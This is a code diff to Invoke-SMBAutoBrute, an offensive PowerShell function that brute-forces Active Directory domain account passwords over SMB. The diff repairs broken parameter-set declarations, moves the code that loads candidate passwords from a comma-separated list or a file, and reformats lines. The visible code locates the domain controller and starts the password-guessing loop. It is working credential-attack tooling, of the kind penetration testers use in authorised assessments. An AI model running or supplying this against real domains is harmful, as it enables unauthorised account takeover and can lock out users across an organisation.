@@ -65,23 +65,23 @@ function Invoke-SMBAutoBrute
 	The script will exit after the first successful authentication.
 
 #>
-    [CmdletBinding(defaultParameterSet = "PassList")] Param(
-    
+    [CmdletBinding(Defaultparametersetname = "PassList")] Param(
+
         [Parameter(ParameterSetName = "PassFile", mandatory=$false)]
-	[Parameter(ParameterSetName = "PassList", mandatory=$true)]
-	[String]$Passwordlist,
-	
+        [Parameter(ParameterSetName = "PassList", mandatory=$true)]
+        [String]$PasswordList,
+        
         [Parameter(Mandatory = $False)]
         [String] $UserList,
 
-        [parameter(ParameterSetName = ""PassFile, Mandatory = $True)]
+        [parameter(ParameterSetName = "PassFile")]
         [String] $PasswordFile,
 
         [parameter(Mandatory = $True)]
         [String] $LockoutThreshold,
 	
-	[parameter(Mandatory = $True)]
-	[String] $Domain,
+	    [parameter(Mandatory = $True)]
+	    [String] $Domain,
 
         [parameter(Mandatory = $False)]
         [int] $Delay,
@@ -102,7 +102,7 @@ function Invoke-SMBAutoBrute
 
         Try {Add-Type -AssemblyName System.DirectoryServices}
         Catch {Write-Error $Error[0].ToString() + $Error[0].InvocationInfo.PositionMessage}
-	
+	   
 
         function Get-PDCe()
         {
@@ -208,31 +208,33 @@ function Invoke-SMBAutoBrute
             Write-Host "[!] Could not locate domain controller. Aborting."
             exit
         }
+        $SetName = $pscmdlet.ParameterSetName
+        
+        if ($SetName -eq "PassList"){
+            write-host "PassList"
+            $pwds = New-Object System.Collections.ArrayList
+            foreach ($pwd in $PasswordList.Split(','))
+            {
+                $pwds.Add($pwd.Trim(' ')) | Out-Null
+             }
 
-
+              Write-Host "[*] PDC: $pdc"
+              Write-Host "[*] Passwords to test: $PasswordList"
+        } else {
+           $length = (get-content $PasswordFile).Length
+           $pwds = New-Object System.Collections.ArrayList
+           foreach($pwd in get-content $PasswordFile){
+                $pwds.Add($pwd) | Out-Null
+                }
+              Write-Host "[*] PDC: $pdc"
+              Write-Host "[*] Number of Passwords loaded from file: $length"
+        }
 
         $dcs = Get-DomainControllers
         $ContextType = [System.DirectoryServices.AccountManagement.ContextType]::Domain
         $PrincipalContext = New-Object System.DirectoryServices.AccountManagement.PrincipalContext($ContextType, $pdc)
-	Write-Host "[*] PDC: $pdc"
 
-	$ParamSetName = $PsCmdlet.ParameterSetName
-	if($ParamSetName -eq "PassList"){
-        	$pwds = New-Object System.Collections.ArrayList
-        	foreach ($pwd in $PasswordList.Split(','))
-        	{
-            		$pwds.Add($pwd.Trim(' ')) | Out-Null
-        	}
-        		Write-Host "[*] Passwords to test: $PasswordList"
-	} else {
-		$PassFileLength = (get-content $PasswordFile).Length
-		$pwds = New-Object System.Collections.ArrayList
-		foreach ($pwd in Get-Content $PasswordFile){
-			$pwds.Add($pwd) | Out-Null
-			}
-		Write-Host "[*] Number of Passwords loaded from file: $PassFileLength"
-	}
-
+        
         Write-Host "[*] Initiating brute. Unless -ShowVerbose was specified, only successes will show..."
         foreach ($p in $pwds)
         {
@@ -294,3 +296,5 @@ function Invoke-SMBAutoBrute
         Write-Host "[*] Completed.`n"
     }
 }
+
+ 
